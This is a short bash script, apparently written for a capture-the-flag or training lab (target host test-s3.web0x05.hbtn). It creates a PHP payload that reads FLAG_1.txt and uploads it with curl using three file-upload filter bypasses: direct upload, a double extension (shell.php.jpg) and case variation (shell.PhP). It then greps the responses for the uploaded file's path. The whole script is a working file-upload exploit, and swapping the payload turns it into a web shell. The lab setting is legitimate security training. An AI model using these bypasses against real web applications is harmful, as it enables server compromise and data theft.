#!/bin/bash

# Client-Side Upload Bypass Script
TARGET="http://test-s3.web0x05.hbtn/task1"
PHP_FILE="shell.php"

echo "[+] Creating PHP payload..."
echo '<?php readfile("FLAG_1.txt") ?>' > $PHP_FILE

echo "[+] Attempting upload bypass methods..."

# Method 1: Direct upload (client-side bypass)
echo "[*] Method 1: Direct PHP upload"
curl -s -X POST "$TARGET" -F "file=@$PHP_FILE" -o response1.html
echo "[*] Response saved to response1.html"

# Method 2: Double extension
echo "[*] Method 2: Double extension bypass"
cp $PHP_FILE shell.php.jpg
curl -s -X POST "$TARGET" -F "file=@shell.php.jpg" -o response2.html
echo "[*] Response saved to response2.html"

# Method 3: Case variation
echo "[*] Method 3: Case variation bypass"  
cp $PHP_FILE shell.PhP
curl -s -X POST "$TARGET" -F "file=@shell.PhP" -o response3.html
echo "[*] Response saved to response3.html"

echo ""
echo "[+] Check response files for upload path"
echo "[+] Then access the uploaded file to get the FLAG"
grep -i "upload\|success\|file\|php" response*.html 2>/dev/null | head -20

